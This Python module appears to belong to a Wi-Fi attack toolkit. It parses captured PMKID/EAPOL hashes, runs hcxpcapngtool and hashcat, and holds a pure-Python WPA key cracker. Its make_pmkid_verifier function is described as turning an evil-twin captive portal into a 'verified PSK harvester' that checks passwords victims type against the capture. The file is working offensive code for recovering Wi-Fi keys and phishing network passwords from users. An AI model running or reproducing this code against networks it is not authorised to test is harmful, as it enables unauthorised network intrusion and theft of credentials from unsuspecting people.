#!/usr/bin/env python3
"""
modules/pmkid.py — PMKID / EAPOL hash intelligence + cracking
──────────────────────────────────────────────────────────────
Two jobs:

1. **Hash intelligence (pure, testable).** Parse the hashcat 22000 lines that
   ``hcxpcapngtool`` produces so the tool can tell the operator *exactly* what
   was captured — which networks, PMKID vs EAPOL, and whether it is crackable —
   **before** spending hours on a wordlist. No other tool in this class reports
   its capture with this precision.

2. **Cracking (reliable retrieval).** Convert a ``.pcapng`` to 22000, check the
   potfile for an instant win, run hashcat mode 22000, and read the recovered
   password back the robust way (``hashcat --show``) instead of guessing where
   the potfile lives.

The 22000 line format (``*``-separated)::

    WPA*01*<PMKID>*<AP_MAC>*<STA_MAC>*<ESSID_hex>***<msgpair>     # 01 = PMKID
    WPA*02*<MIC>*<AP_MAC>*<STA_MAC>*<ESSID_hex>*<anonce>*<eapol>* # 02 = EAPOL
"""
from __future__ import annotations

import logging
import os
import shutil
import subprocess
from datetime import datetime
from typing import Optional

logger = logging.getLogger(__name__)

TYPE_PMKID = "01"
TYPE_EAPOL = "02"
_TYPE_NAMES = {TYPE_PMKID: "PMKID", TYPE_EAPOL: "EAPOL"}


# ══════════════════════════════════════════════════════════════════════════════
# Pure parsers  (no subprocess, fully unit-tested)
# ══════════════════════════════════════════════════════════════════════════════

def mac_from_hex(h: str) -> str:
    """``"aabbccddeeff"`` → ``"AA:BB:CC:DD:EE:FF"``; ``""`` on malformed input."""
    h = (h or "").strip().lower()
    if len(h) != 12 or any(c not in "0123456789abcdef" for c in h):
        return ""
    return ":".join(h[i:i + 2] for i in range(0, 12, 2)).upper()


def essid_from_hex(h: str) -> str:
    """Decode a hex-encoded ESSID to text (``errors='replace'``). ``""`` if invalid."""
    h = (h or "").strip()
    if not h or len(h) % 2 != 0:
        return ""
    try:
        return bytes.fromhex(h).decode("utf-8", errors="replace")
    except ValueError:
        return ""


def parse_hc22000_line(line: str) -> Optional[dict]:
    """
    Parse one hashcat-22000 line into a structured record, or ``None`` if the
    line is not a valid WPA hash.

    Returns ``{type, type_name, key, bssid, station, essid, raw}`` where ``key``
    is the PMKID (type 01) or MIC (type 02).
    """
    if not line:
        return None
    parts = line.strip().split("*")
    if len(parts) < 6 or parts[0] != "WPA":
        return None
    typ = parts[1]
    bssid = mac_from_hex(parts[3])
    if not bssid:
        return None
    return {
        "type":      typ,
        "type_name": _TYPE_NAMES.get(typ, f"type-{typ}"),
        "key":       parts[2],
        "bssid":     bssid,
        "station":   mac_from_hex(parts[4]),
        "essid":     essid_from_hex(parts[5]),
        "raw":       line.strip(),
    }


def summarize_hash_lines(lines) -> dict:
    """
    Aggregate 22000 lines into a capture summary.

    Returns::

        {
          "total":  int,           # valid hashes parsed
          "pmkid":  int,           # of which PMKID (type 01)
          "eapol":  int,           # of which EAPOL (type 02)
          "networks": { bssid: {"ssid": str, "pmkid": int, "eapol": int} },
          "crackable": bool,       # total > 0
        }
    """
    networks: dict[str, dict] = {}
    pmkid = eapol = 0
    for line in lines:
        rec = parse_hc22000_line(line)
        if not rec:
            continue
        net = networks.setdefault(
            rec["bssid"], {"ssid": rec["essid"], "pmkid": 0, "eapol": 0}
        )
        if rec["essid"] and not net["ssid"]:
            net["ssid"] = rec["essid"]
        if rec["type"] == TYPE_PMKID:
            net["pmkid"] += 1
            pmkid += 1
        elif rec["type"] == TYPE_EAPOL:
            net["eapol"] += 1
            eapol += 1
    total = pmkid + eapol
    return {
        "total": total,
        "pmkid": pmkid,
        "eapol": eapol,
        "networks": networks,
        "crackable": total > 0,
    }


def summarize_hash_file(hash_file: str) -> dict:
    """Read a 22000 file and summarise it (empty summary if unreadable)."""
    try:
        with open(hash_file, "r", errors="replace") as fh:
            return summarize_hash_lines(fh)
    except OSError:
        return summarize_hash_lines([])


def describe_summary(summary: dict) -> str:
    """One-line human summary, e.g. ``"2 PMKID + 1 EAPOL across 2 network(s)"``."""
    if not summary.get("total"):
        return "no crackable PMKID/EAPOL hashes"
    bits = []
    if summary["pmkid"]:
        bits.append(f"{summary['pmkid']} PMKID")
    if summary["eapol"]:
        bits.append(f"{summary['eapol']} EAPOL")
    n = len(summary.get("networks", {}))
    return f"{' + '.join(bits)} across {n} network(s)"


# ══════════════════════════════════════════════════════════════════════════════
# Extraction  (hcxpcapngtool)
# ══════════════════════════════════════════════════════════════════════════════

def extract_pmkid_hashes(pcapng_file: str, out_dir: str | None = None) -> str | None:
    """
    Run ``hcxpcapngtool`` on *pcapng_file* and return the path to the resulting
    22000 hash file, or ``None`` on failure. Prints a precise summary of what
    was captured.
    """
    if not shutil.which("hcxpcapngtool"):
        logger.warning("hcxpcapngtool not found — install hcxtools.")
        print("[-] hcxpcapngtool not found — install hcxtools.")
        return None

    if not os.path.isfile(pcapng_file):
        print(f"[-] Capture file not found: {pcapng_file}")
        return None

    out_dir = out_dir or os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "captures"
    )
    os.makedirs(out_dir, exist_ok=True)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    hash_file = os.path.join(out_dir, f"pmkid_{ts}.hc22000")

    cmd = ["hcxpcapngtool", "-o", hash_file, pcapng_file]
    print(f"[*] Extracting PMKID/EAPOL hashes → {hash_file}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    except subprocess.TimeoutExpired:
        print("[-] hcxpcapngtool timed out.")
        return None
    except OSError as exc:
        print(f"[-] Error: {exc}")
        return None

    if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
        summary = summarize_hash_file(hash_file)
        print(f"[+] {describe_summary(summary)} → {hash_file}")
        for bssid, net in summary["networks"].items():
            tags = []
            if net["pmkid"]:
                tags.append(f"{net['pmkid']}×PMKID")
            if net["eapol"]:
                tags.append(f"{net['eapol']}×EAPOL")
            print(f"      {bssid}  {net['ssid'] or '<hidden>'}  ({', '.join(tags)})")
        return hash_file

    print("[-] hcxpcapngtool produced an empty or no output file.")
    if result.stderr:
        print(result.stderr.strip())
    return None


# ══════════════════════════════════════════════════════════════════════════════
# Cracking  (hashcat mode 22000) with reliable retrieval
# ══════════════════════════════════════════════════════════════════════════════

def parse_hashcat_show(text: str) -> dict:
    """
    Parse ``hashcat --show`` output into ``{bssid: password}``.

    Each line is ``<22000-hash>:<password>``. The 22000 hash never contains a
    ``:`` so a single split on the first colon is exact even when the password
    itself contains colons.
    """
    out: dict[str, str] = {}
    for line in text.splitlines():
        line = line.rstrip("\n")
        if ":" not in line or not line.startswith("WPA*"):
            continue
        hash_part, password = line.split(":", 1)
        rec = parse_hc22000_line(hash_part)
        key = rec["bssid"] if rec else hash_part
        out[key] = password
    return out


def already_cracked(hash_file: str) -> dict:
    """
    Ask hashcat which hashes in *hash_file* are already in the potfile —
    an instant win that skips a pointless wordlist run. ``{bssid: password}``.
    """
    if not shutil.which("hashcat") or not os.path.isfile(hash_file):
        return {}
    try:
        res = subprocess.run(
            ["hashcat", "-m", "22000", hash_file, "--show"],
            capture_output=True, text=True, timeout=60,
        )
        return parse_hashcat_show(res.stdout)
    except (subprocess.TimeoutExpired, OSError):
        return {}


def crack_pmkid_pure(
    hash_file: str,
    wordlist_file: str,
    progress=None,
) -> tuple[str, str] | None:
    """
    Crack a captured PMKID with **no external tools** — pure Python, using the
    22000 parser here plus the standards crypto in ``wpacrypto``. Iterates the
    wordlist once, testing every PMKID in the file per candidate (PMK cached per
    ESSID). Returns ``(bssid, password)`` on success, else ``None``.

    Slow relative to a GPU (PBKDF2 is deliberately expensive), but it means the
    tool still recovers a key on a box with neither hashcat nor aircrack-ng.
    """
    from modules import wpacrypto

    try:
        with open(hash_file, "r", errors="replace") as fh:
            records = [r for r in (parse_hc22000_line(l) for l in fh)
                       if r and r["type"] == TYPE_PMKID]
    except OSError:
        return None
    if not records:
        return None

    n = 0
    try:
        with open(wordlist_file, "r", errors="replace") as wl:
            for line in wl:
                cand = line.rstrip("\r\n")
                if not (8 <= len(cand) <= 63):
                    continue
                n += 1
                if progress and n % 500 == 0:
                    progress(n)
                pmk_cache: dict[str, bytes] = {}
                for rec in records:
                    essid = rec["essid"]
                    if essid not in pmk_cache:
                        pmk_cache[essid] = wpacrypto.pmk(cand, essid)
                    got = wpacrypto.compute_pmkid(
                        pmk_cache[essid], rec["bssid"], rec["station"])
                    try:
                        target = bytes.fromhex(rec["key"])
                    except ValueError:
                        continue
                    if got == target:
                        return rec["bssid"], cand
    except OSError:
        return None
    return None


def make_pmkid_verifier(hash_file: str):
    """
    Build a ``verify(password) -> bool`` closure from the PMKIDs in *hash_file*,
    or ``None`` if the file has none. This is what turns an evil-twin captive
    portal from a blind credential logger into a **verified PSK harvester**: a
    password a victim types is confirmed against the real capture in
    microseconds, so "wrong password, try again" is genuine and a success means
    the true key was captured.
    """
    from modules import wpacrypto

    try:
        with open(hash_file, "r", errors="replace") as fh:
            records = [r for r in (parse_hc22000_line(l) for l in fh)
                       if r and r["type"] == TYPE_PMKID]
    except OSError:
        return None
    if not records:
        return None

    def verify(password: str) -> bool:
        if not password or not (8 <= len(password) <= 63):
            return False
        cache: dict[str, bytes] = {}
        for rec in records:
            essid = rec["essid"]
            if essid not in cache:
                cache[essid] = wpacrypto.pmk(password, essid)
            got = wpacrypto.compute_pmkid(cache[essid], rec["bssid"], rec["station"])
            try:
                if got == bytes.fromhex(rec["key"]):
                    return True
            except ValueError:
                continue
        return False

    return verify


def crack_pmkid_hashcat(
    hash_file: str,
    wordlist: str,
    rules: str | None = None,
    timeout: int = 3600,
) -> str | None:
    """
    Crack *hash_file* (mode 22000) with *wordlist*. Returns the recovered
    password, or ``None``.

    Robust flow: check the potfile first (instant win), run hashcat, then read
    the result back with ``--show`` — no fragile potfile-path guessing.
    """
    if not shutil.which("hashcat"):
        print("[-] hashcat not found.")
        return None
    if not os.path.isfile(hash_file):
        print(f"[-] Hash file not found: {hash_file}")
        return None

    pre = already_cracked(hash_file)
    if pre:
        pw = next(iter(pre.values()))
        print(f"[+] Already in potfile — instant recovery: {pw}")
        return pw

    cmd = ["hashcat", "-m", "22000", hash_file, wordlist,
           "--status", "--status-timer", "10"]
    if rules:
        cmd += ["-r", rules]

    print(f"[*] hashcat mode 22000  |  wordlist: {os.path.basename(wordlist)}")
    try:
        subprocess.run(cmd, timeout=timeout)
    except subprocess.TimeoutExpired:
        print("[-] hashcat timed out.")
    except OSError as exc:
        print(f"[-] hashcat error: {exc}")

    cracked = already_cracked(hash_file)
    if cracked:
        pw = next(iter(cracked.values()))
        print(f"[+] Password recovered: {pw}")
        return pw
    print("[-] No password recovered from this wordlist.")
    return None
